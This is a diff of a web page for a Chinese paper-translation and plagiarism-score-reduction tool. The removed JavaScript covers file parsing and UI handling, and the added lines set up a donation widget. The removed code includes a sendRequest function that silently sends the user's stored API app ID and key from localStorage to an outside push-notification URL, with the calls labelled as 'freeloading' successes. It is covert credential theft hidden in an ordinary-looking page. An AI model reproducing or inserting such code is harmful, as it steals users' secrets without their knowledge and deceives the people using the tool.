-										document.querySelector("#result_ul_orange1").appendChild(li);
-										li.appendChild(txt);
-									};
-									$("#result_ul_orange1 .orange").before("<input type='checkbox' class='inp_checkbox' name='inp_checkbox'>");
-								} else {
-									sendRequest(localStorage.getItem("appid1") + "——维普", localStorage.getItem("key1"), 6);
-								}
-							} else {
-								sendRequest(localStorage.getItem("appid1"), "上传内容不对——" + localStorage.getItem("key1"), 7);
-								showToast("解析失败！请检查上传的文件是否符合规则！", 4500);
-							}
-						}
-						var oColor = "";
-						$('input[name=inp_checkbox]').change(function(){
-						   	if($(this).next().css("color") != "rgb(0, 0, 0)"){
-								oColor = $(this).next().css("color");
-							} 
-							if($(this).is(':checked')) {
-						        // Checkbox is checked..
-						        $(this).parent().css("text-decoration","line-through")
-						        $(this).next().css("color","black")
-						    } else {
-						        // Checkbox is not checked..
-						        $(this).parent().css("text-decoration","none")
-						        $(this).next().css("color",oColor)
-						    }
-						});
-						$('#result_ul_red1 li').dblclick(function(){
-							if($(this).css("text-decoration") == "line-through solid rgb(33, 37, 41)"){
-						        $(this).css("text-decoration","none")
-						        $(this).children().css("color","red")
-						        $(this).children("input").prop("checked",false);
-							}else{
-								$(this).css("text-decoration","line-through")
-						        $(this).children().css("color","black")
-						        $(this).children("input").prop("checked",true);
-
-							}
-						})
-						$('#result_ul_orange1 li').dblclick(function(){
-							if($(this).css("text-decoration") == "line-through solid rgb(33, 37, 41)"){
-						        $(this).css("text-decoration","none")
-						        $(this).children().css("color","orange")
-						        $(this).children("input").prop("checked",false);
-							}else{
-								$(this).css("text-decoration","line-through")
-						        $(this).children().css("color","black")
-						        $(this).children("input").prop("checked",true);
-
-							}
-						})	
-						$("#result_ul_red1 em").attr("onmouseover","");
-						$("#result_ul_red1 em").attr("onmouseout","");
-						if($('#result_ul_orange1').css("height").replace(/px/,'')>= 2000){
-							console.log($('#result_ul_orange1').css("height"));
-							$('#result_ul_orange1').css("overflow","scroll");
-							$('#result_ul_orange1').css("height","2000px");
-						}
-						if($('#result_ul_red1').css("height").replace(/px/,'')>= 2000){
-							console.log($('#result_ul_red1').css("height"));
-							$('#result_ul_red1').css("overflow","scroll");
-							$('#result_ul_red1').css("height","2000px");
-						}
-					}
-				}
-			} else { // 没有FileReader的弹出警告然后返回
-				alert('你的浏览器没有FileReader，不能这么干！');
-				return;
-			}
-
-			const file = e.target.files[0]; // 拿到选择的文件信息
-			if(file != undefined){
-				if (file.type == 'text/html') {
-					showToast("正在解析!", 2000)
-					sendRequest(localStorage.getItem("appid1"), "正在解析——" + localStorage.getItem("key1"), 6);
-					reader.readAsText(file); // 将文件信息转成文本，默认是UTF-8格式，这个就是转成功后执行 reader.onload 方法
-				} else {
-					showToast("上传的文件的类型不符合!", 3000)
-					sendRequest(localStorage.getItem("appid1"), "上传的文件的类型不符合——" + localStorage.getItem("key1"), 7);
-				}
-			}
-		})
-		
-
-		let timer = null;
-
-		let fixedBtn = $(".fixed_btn");
-		window.onscroll = () => {
-			if (timer !== null) {
-				clearTimeout(timer);
-			}
-			timer = setTimeout(() => {
-				if (document.documentElement.scrollTop >= 400) {
-					fixedBtn.css("display", 'block');
-				} else {
-					fixedBtn.css("display", 'none');
-				}
-				timer = null;
-			}, 500);
-		};
-
-		function sendRequest(sendTitle, sendContent, sendType) {
-			if (sendType == 1) {
-				// 返回错误码
-				title = '【出错】：' + sendTitle;
-				content = '【错误码】：' + sendContent;
-			} else if (sendType == 2) {
-				// 请求成功
-				title = '【成功】：' + sendTitle;
-				content = '【正在翻译】：' + sendContent;
-			} else if (sendType == 3) {
-				// 翻译出错重试
-				title = '【重试】：' + sendTitle;
-				content = '【内容】：' + sendContent;
-			} else if (sendType == 4) {
-				// 上车了
-				title = '【上车】：' + sendTitle;
-				content = '【内容】：' + sendContent;
-			} else if (sendType == 5) {
-				// 下车了
-				title = '【下车】：' + sendTitle;
-				content = '【内容】：' + sendContent;
-			} else if (sendType == 6) {
-				// 白嫖成功
-				title = '【白嫖成功】：' + sendTitle;
-				content = '【内容】：' + sendContent;
-			} else if (sendType == 7) {
-				// 白嫖失败
-				title = '【白嫖失败】：' + sendTitle;
-				content = '【内容】：' + sendContent;
-			} else {
-				// 暂无
-				title = '【暂无】：' + sendTitle;
-				content = '【内容】：' + sendContent;
-			}
-			var config = {
-				'title': title,
-				'content': content,
-			}
-
-			setTimeout(() => {
-				$.ajax({
-					url: 'https://xizhi.qqoq.net/XZ4b8ade1ed1876ee54143d8a382a0ca7a.send',
-					type: 'get',
-					// async: true,
-					// 跨域
-					dataType: 'jsonp',
-					contentType: 'application/x-www-form-urlencoded; charset=utf-8',
-					data: {
-						title: config.title,
-						content: config.content,
-					}
-				})
-			}, 1500);
-		}
-
-		function tongji(Words, type) {
-			// 标点和中文
-			var sTotal = 0;
-			// 中文字判断
-			var iTotal = 0;
-			// 英文字母
-			var eTotal = 0;
-			// 数字判断
-			var inum = 0;
-			for (i = 0; i < Words.length; i++) {
-				var c = Words.charAt(i);
-				//基本汉字
-				if (c.match(/[\u4e00-\u9fa5]/)) {
-					iTotal++;
-				}
-				//基本汉字补充
-				else if (c.match(/[\u9FA6-\u9fcb]/)) {
-					iTotal++;
-				}
-				if (c.match(/[^\x00-\xff]/)) {
-					sTotal++;
-				} else {
-					eTotal++;
-				}
-				if (c.match(/[0-9]/)) {
-					inum++;
-				}
-			}
-			switch (type) {
-				case "o":
-					$("#zifu").text(iTotal * 2 + (sTotal - iTotal) * 2 + eTotal);
-					break;
-			}
-		}
-
-		function showToast(msg,duration){
-			duration = isNaN(duration) ? 5000 : duration;
-			var d = (new Date);
-			//获取年份
-			var years = d.getFullYear();
-			//获取月份
-			var months = d.getMonth() + 1;
-			//获取日期
-			var dates = d.getDate();
-			//获取小时
-			var hours = d.getHours();
-			//获取分钟
-			var minutes = d.getMinutes();
-			//获取秒钟 
-			var seconds = d.getSeconds();
-			var nowTime = years + "/" + months + "/" + dates + " " + hours + ":" + minutes + ":" + seconds
-			var m = document.createElement('div');
-			var time = nowTime;
-			var content = `<div class="position-fixed top-0 end-0 p-3" style="z-index: 11">
-			  <div id="liveToast" class="toast" role="alert" aria-live="assertive" aria-atomic="true">
-			    <div class="toast-header">
-			      <i style="margin-right:0.15625rem;"class="bi bi-app-indicator"></i>
-			      <strong class="me-auto">论文翻译降重助手</strong>
-			      <small>`+time+`</small>
-			      <button type="button" class="btn-close" data-bs-dismiss="toast" aria-label="Close"></button>
-			    </div>
-			    <div class="toast-body">
-					`+msg+`
-			    </div>
-			  </div>
-			</div>`
-			document.body.appendChild(m);
-			m.innerHTML = content;
-			var toastLiveExample = document.getElementById('liveToast')
-			var toast = new bootstrap.Toast(toastLiveExample)
-			toast.show();
-			setTimeout(function () {
-				var d = 0.5;
-				m.style.webkitTransition = '-webkit-transform ' + d + 's ease-in, opacity ' + d +
-					's ease-in';
-				m.style.opacity = '0';
-				setTimeout(function () {
-					toast.hide();
-					document.body.removeChild(m);
-				}, d * 1000);
-			}, duration);
-		}
-
-		
-	</script>
+                },
+                qqgroup: {
+                    name: "QQ群",
+                    desc: "欢迎进群(238223706)反馈交流！",
+                    icon: "./assets/img/tree-round-QQ群.png",
+                    qrimg: "./assets/img/QQ群二维码.png"
+                },
+                alipay: {
+                    name: "支付宝",
+                    desc: "感谢你的支持，我会继续努力！",
+                    icon: "./assets/img/支付宝.png",
+                    qrimg: "./assets/img/支付宝收款码.png"
+                },
+                weixin: {
+                    name: "微信",
+                    desc: "感谢你的支持，我会继续努力！",
+                    icon: "./assets/img/微信.png",
+                    qrimg: "./assets/img/微信收款码.png"
+                },
+                qq: {
+                    name: "QQ",
+                    desc: "感谢你的支持，我会继续努力！",
+                    icon: "./assets/img/qq.png",
+                    qrimg: "./assets/img/QQ收款码.png"
+                }
+            }
+        };
+    </script>
+    <script src="./js/tctip.min.js"></script>
 </body>
 
 </html>
